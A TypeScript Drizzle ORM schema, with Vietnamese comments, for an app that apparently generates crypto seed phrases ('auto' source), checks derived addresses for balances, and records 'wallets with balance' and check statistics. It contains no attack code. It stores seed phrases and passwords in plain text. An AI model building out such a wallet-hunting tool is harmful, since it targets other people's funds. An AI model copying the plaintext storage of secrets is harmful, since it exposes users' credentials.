import { sqliteTable, text, integer, blob } from "drizzle-orm/sqlite-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = sqliteTable("users", {
  id: integer("id").primaryKey({ autoIncrement: true }),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
});

export const wallets = sqliteTable("wallets", {
  id: integer("id").primaryKey({ autoIncrement: true }),
  blockchain: text("blockchain").notNull(), // "BTC", "ETH", "BSC", "SOL", "DOGE"
  address: text("address").notNull(),
  balance: text("balance").notNull(), // Store as string to maintain precision
  seedPhrase: text("seed_phrase").notNull(),
  path: text("derivation_path"),
  createdAt: integer("created_at", { mode: 'timestamp' }).notNull().defaultNow(),
  source: text("source").notNull().default("auto"), // 'auto' hoặc 'manual'
  metadata: text("metadata", { mode: 'json' }), // For additional blockchain-specific data
});

// Bảng mới để lưu các seed phrases được kiểm tra thủ công (dù có số dư hay không)
export const manualChecks = sqliteTable("manual_checks", {
  id: integer("id").primaryKey({ autoIncrement: true }),
  seedPhrase: text("seed_phrase").notNull(),
  timestamp: integer("timestamp", { mode: 'timestamp' }).notNull().defaultNow(),
  metadata: text("metadata", { mode: 'json' }).default("{}"),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
});

export const insertWalletSchema = createInsertSchema(wallets).pick({
  blockchain: true,
  address: true,
  balance: true,
  seedPhrase: true,
  path: true,
  source: true,
  metadata: true,
});

export const insertManualCheckSchema = createInsertSchema(manualChecks).pick({
  seedPhrase: true,
  timestamp: true,
  metadata: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;

export type InsertWallet = z.infer<typeof insertWalletSchema>;
export type Wallet = typeof wallets.$inferSelect;

export type InsertManualCheck = z.infer<typeof insertManualCheckSchema>;
export type ManualCheck = typeof manualChecks.$inferSelect;

// Custom types for the application
export type BlockchainType = "BTC" | "ETH" | "BSC" | "SOL" | "DOGE";

export const blockchainSchema = z.enum(["BTC", "ETH", "BSC", "SOL", "DOGE"]);
export const seedPhraseSchema = z.string().refine(
  (phrase) => {
    const words = phrase.trim().split(/\s+/);
    return words.length === 12 || words.length === 24;
  },
  {
    message: "Seed phrase must have 12 or 24 words",
  }
);

// Định nghĩa kiểu dữ liệu cho địa chỉ ví
export interface WalletAddress {
  blockchain: BlockchainType;
  type?: string;
  batchNumber: number;
  addresses: string[];
}

// Định nghĩa kiểu dữ liệu cho kết quả kiểm tra số dư
export interface BalanceCheckResult {
  address: string;
  balance: string;
  hasBalance: boolean;
  blockchain: BlockchainType;
}

// Định nghĩa kiểu dữ liệu cho ví có số dư
export interface WalletWithBalance {
  blockchain: BlockchainType;
  address: string;
  balance: string;
  seedPhrase: string;
}

// Định nghĩa kiểu dữ liệu cho thống kê kiểm tra ví
export interface WalletCheckStats {
  created: number;
  checked: number;
  withBalance: number;
}
